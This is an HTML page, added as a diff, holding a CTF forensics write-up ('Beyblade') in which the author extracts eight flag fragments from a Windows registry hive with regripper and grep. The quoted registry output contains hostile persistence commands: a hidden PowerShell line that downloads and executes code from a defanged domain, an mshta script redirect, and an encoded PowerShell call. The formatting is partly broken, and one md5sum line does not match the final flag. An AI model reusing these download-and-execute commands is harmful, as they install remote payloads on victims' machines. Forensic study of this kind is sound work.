@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2025-10-14 · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="huntress/2025/2025-10-14.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/huntress/index.html">Huntress CTF</a> &rsaquo; <a href="/huntress/2025/index.html">2025</a></div>
+  <h1 id="2025-10-14">2025-10-14</h1>
+<h1 id="beyblade"><strong>🔍 Beyblade</strong></h1>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>```plain text<br />
+saw fragments/pieces/shards/sections/whatever of the flag</p>
+<pre><code>
+&lt;span class=&quot;img-missing&quot;&gt;image unavailable&lt;/span&gt;
+
+```plain text
+regripper -r beyblade -a &gt; a, and grep for all fragments
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<p><code>``plain text
+1. **Piece 1/8:</code>47cb<code>** -</code>Run<code>key:</code>flag_value_1_of_8-47cb<code>2. **Piece 2/8:</code>5cd4<code>** -</code>RunOnce<code>key:</code>hash-value-2-8_5cd4<code>3. **Piece 3/8:</code>6d7b<code>** -</code>TypedURLs<code>:</code>chunk+3of8:6d7b<code>4. **Piece 4/8:</code>b34a<code>** -</code>RunMRU<code>:</code>piece:4/8-b34a<code>5. **Piece 5/8:</code>0d9c<code>** -</code>TypedPaths<code>:</code>fragment-5_of_8-0d9c<code>6. **Piece 6/8:</code>315a<code>** -</code>apppaths<code>:</code>wmiprvse.exe ... -tag shard(6/8)-315a<code>✓
+7. **Piece 7/8:</code>99bb<code>** -</code>muicache<code>:</code>component#7of8-99bb<code>✓
+8. **Piece 8/8:</code>58de<code>** -</code>Terminal Server Client<code>:</code>segment-8-of-8=58de`</p>
+<p>Concatenating all 8 pieces<br />
+47cb + 5cd4 + 6d7b + b34a + 0d9c + 315a + 99bb + 58de<br />
+= 47cb5cd46d7bb34a0d9c315a99bb58de</p>
+<p>echo -n "flag_value_1_of_8-47cb_hash-value-2-8_5cd4_chunk+3of8:6d7b_piece:4/8-b34a_fragment-5_of_8-0d9c_6_of_8-9f1e_7_of_8-a2c0_segment-8-of-8=58de" | md5sum</p>
+<pre><code>
+&lt;span class=&quot;img-missing&quot;&gt;image unavailable&lt;/span&gt;
+```plain text
+grep -a -iE 'flag_value|hash-value|chunk|piece|fragment|shard|component|segment' A
+  wmiprvse.exe - C:\Windows\System32\wmiprvse.exe /k netsvcs -tag shard(6/8)-315a
+  C:\Windows\System32\mmc.exe (Microsoft Management Console - component#7of8-99bb)
+  Windows Update Monitor - powershell -nop -w hidden -c iwr http://cdn.update-catalog[.]com/agent?v=1 -UseBasicParsing|iex ; # flag_value_1_of_8-47cb
+  OneDrive Setup - cmd /c start /min mshta about:&lt;script&gt;location='http://telemetry.sync-live[.]net/bootstrap?stage=init&amp;note=hash-value-2-8_5cd4'&lt;/script&gt;
+r1   powershell.exe -e JABNAE0A; ## piece:4/8-b34a
+  UsernameHint: administrator|segment-8-of-8=58de
+url2     C:\Users\Public\fragment-5_of_8-0d9c
+  url1 -&gt; http://auth.live-sync[.]net/login?session=chunk+3of8:6d7b
+</code></pre>
+<p>```plain text<br />
+1 -  LastWrite Time 2025-09-27 19:16:09Z<br />
+  OneDrive - "C:\Users\User\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background<br />
+  Windows Update Monitor - powershell -nop -w hidden -c iwr http://cdn.update-catalog[.]com/agent?v=1 -UseBasicParsing|iex ; # flag_value_1_of_8-47cb<br />
+  MicrosoftEdgeAutoLaunch_C46CFC0629905CC775E70B50EA8A519C - "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window --win-session-start</p>
+<p>2 -  Software\Microsoft\Windows\CurrentVersion\RunOnce<br />
+LastWrite Time 2025-09-27 19:16:23Z<br />
+  OneDrive Setup - cmd /c start /min mshta about:<script>location='http://telemetry.sync-live[.]net/bootstrap?stage=init&amp;note=hash-value-2-8_5cd4'</script></p>
+<p>3 -  Software\Microsoft\Internet Explorer\TypedURLs<br />
+LastWrite Time 2025-09-27 19:16:23Z<br />
+  url1 -&gt; http://auth.live-sync[.]net/login?session=chunk+3of8:6d7b</p>
+<p>4 -  LastWrite Time 2025-09-27 19:16:23Z<br />
+MRUList =<br />
+r1   powershell.exe -e JABNAE0A; ## piece:4/8-b34a</p>
+<p>5 -  url1     C:\<br />
+url2     C:\Users\Public\fragment-5_of_8-0d9c</p>
+<hr />
+<p>typedurls v.20200526</p>
+<p>6 -  2025-09-27 19:16:23Z<br />
+  wmiprvse.exe - C:\Windows\System32\wmiprvse.exe /k netsvcs -tag shard(6/8)-315a</p>
+<p>7 -  Software\Microsoft\Windows\ShellNoRoam\MUICache<br />
+LastWrite Time 2025-09-27 19:16:23Z<br />
+  C:\Windows\System32\mmc.exe (Microsoft Management Console - component#7of8-99bb)<br />
+Local Settings\Software\Microsoft\Windows\Shell\MUICache not found.</p>
+<p>8 -  fileshare.local  LastWrite time: 2025-09-27 19:16:23Z<br />
+  UsernameHint: administrator|segment-8-of-8=58de</p>
+<pre><code>```plain text
+47cb - Run key
+5cd4 - RunOnce key
+6d7b - TypedURLs
+b34a - RunMRU
+0d9c - TypedPaths
+315a - apppaths (wmiprvse.exe line)
+99bb - muicache (mmc.exe line)
+58de - tsclient
+</code></pre>
+<p><code>plain text
+flag{47cb5cd46d7bb34a0d9c315a99bb58de}</code></p>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
